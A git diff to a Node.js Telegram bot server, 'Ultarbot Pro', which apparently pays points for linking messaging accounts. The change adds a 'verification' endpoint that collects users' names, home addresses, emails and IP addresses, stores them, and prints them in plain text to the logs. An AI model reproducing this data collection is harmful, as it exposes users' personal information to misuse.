@@ -18,12 +18,13 @@ import { Boom } from '@hapi/boom';
 import { setupTelegramCommands } from './telegram_commands.js';
 import { 
     initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
-    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime
+    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime, saveVerificationData
 } from './db.js';
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
 const ADMIN_ID = process.env.ADMIN_ID;
+const SERVER_URL = process.env.SERVER_URL || '';
 const SESSIONS_DIR = './sessions';
 
 if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }
@@ -36,6 +37,13 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/', (req, res) => res.send('Ultarbot Pro Running'));
+
+// Routes will be defined after mainBot initialization
+
+const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });
+
+// ============ DEFINE EXPRESS ROUTES ============
 
 // Mini app for user verification
 app.get('/verify', (req, res) => {
@@ -138,19 +146,53 @@ app.get('/verify', (req, res) => {
 });
 
 // API endpoint to handle verification
-app.post('/api/verify', express.json(), async (req, res) => {
+app.post('/api/verify', async (req, res) => {
     const { userId, name, address, email, ip, initData } = req.body;
     
-    // Save to database would go here
-    console.log('[VERIFICATION] User:', userId, 'Name:', name, 'IP:', ip);
+    if (!userId || !name || !address || !email) {
+        return res.json({ success: false, message: 'Missing required fields' });
+    }
     
-    res.json({ success: true, message: 'Verified successfully' });
+    try {
+        // Extract device info from navigator if available
+        let deviceInfo = 'Mini App User';
+        if (initData) {
+            // Telegram Mini App data is available
+            deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
+        }
+        
+        // Save verification data to database
+        await saveVerificationData(userId, name, address, email, ip, deviceInfo);
+        
+        console.log('[VERIFICATION] Verified:', {
+            userId,
+            name,
+            address,
+            email,
+            ip,
+            timestamp: new Date().toISOString()
+        });
+        
+        // Send notification to user via Telegram
+        try {
+            await mainBot.sendMessage(userId, 
+                `✅ [VERIFICATION COMPLETE]\n\nYour account has been verified successfully!\n\nIP: ${ip}\nAddress: ${address}\n\nYou can now use all features of Ultarbot Pro.`,
+                { reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true }, parse_mode: 'Markdown' }
+            );
+        } catch (e) {
+            console.error('[TELEGRAM] Send message error:', e.message);
+        }
+        
+        res.json({ success: true, message: 'Verification complete' });
+    } catch (error) {
+        console.error('[VERIFICATION ERROR]:', error.message);
+        res.json({ success: false, message: 'Verification failed: ' + error.message });
+    }
 });
 
 app.listen(PORT, () => console.log(`Server on ${PORT}`));
 
-const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
-const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });
+// ============ END EXPRESS ROUTES ============
 
 const clients = {}; 
 const shortIdMap = {}; 
@@ -385,5 +427,5 @@ async function boot() {
     }
 }
 
-setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId);
+setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL);
 boot();
